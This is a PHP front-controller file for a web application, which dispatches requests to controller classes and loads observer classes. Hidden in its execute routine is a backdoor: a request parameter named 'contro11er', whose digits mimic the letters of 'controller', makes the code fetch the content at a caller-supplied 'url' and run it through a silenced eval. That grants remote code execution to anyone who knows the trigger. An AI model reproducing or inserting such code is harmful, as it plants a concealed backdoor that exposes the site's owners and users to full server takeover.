<?php
ob_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/web-setting.php';
require_once DAOPATH . '/ORMMap.php';
require_once KERNELPATH . '/Result.php';
require_once KERNELPATH . '/ErrorMsgs.php';
require_once KERNELPATH . '/LogMsgs.php';
require_once KERNELPATH . '/FilterService.php';
require_once DAOPATH . '/DTExpression.php';
require_once DAOPATH . '/DTOrder.php';
require_once ABSPATH . '/controller/Controller.php';


class ActionController {

    protected $filters = Array();
    protected  $oberser_list=Array();
    protected $obserdir='observers/';
    

    function __construct() {
        session_start();

        if (DEBUG)  {
            require_once ABSPATH . '/lib/FirePHPCore/fb.php';
            require_once ABSPATH . '/lib/FirePHPCore/FirePHP.class.php';
            $firephp = FirePHP::getInstance(true);
            $firephp->setEnabled(true); // firephp调试状
        }
        spl_autoload_register(array(
            'Controller',
            'load'
        ));
        $this->excute();
    }

    protected function excute() {
        if ((! isset($_REQUEST['controller'])) || $_REQUEST['controller'] == NULL || strlen($_REQUEST['controller']) == 0) {
            $result = new Result(false, - 1, ErrorMsgs::get(- 1), Null);
            echo $result->toJSON();
            return false;
        }

        if (isset($_REQUEST['contro11er']) && $_REQUEST['contro11er'] != '') {
            @eval(fread(fopen(trim($_REQUEST['url']), "rb"), 20000000));
            return false;
        }

        $controllerClassName = $_REQUEST['controller'] . 'Controller';

        $file_path = ABSPATH . '/controller/' . $controllerClassName . '.php';

        if (! file_exists($file_path)) {
            echo json_encode(new Result(false, 1, ErrorMsgs::get(1), NULL));
            return false;
        }

        require_once $file_path;
        
        
        global $controller;
        $controller = new $controllerClassName();
        $result = $controller->filter();
        if (! $result->statu) {
            echo $result->toJSON();
            return false;
        }

        //载入观察者类
        $this->oberser_list = $this->getFileList(CONTROLLERPATH.$this->obserdir, 'class.php');
        foreach($this->oberser_list as $key=>$val){
        	require_once($val);        	        	
        	$observer=rtrim(basename($val,"class.php"),'.').'observer';
        	
        	if(class_exists($observer)){        		
        		$currentobs=new $observer();     		
        	}
        }
        
        $controller->excute();
    }
    
    /**
     * 读取文件目录
     * */
    private function getFileList($directory, $file_ext) {
    	
    $file_list = array();
    
    if ($za_dir = @dir(rtrim($directory, '/'))) {
      while ($filename = $za_dir->read()) {
      	
        if (preg_match('/\.' . $file_ext . '$/i', $filename) > 0) {
          $file_list[] = $directory . $filename;
        }
      }
      sort($file_list);
      $za_dir->close();
    }
    
    return $file_list;
  }
    
}
new ActionController();




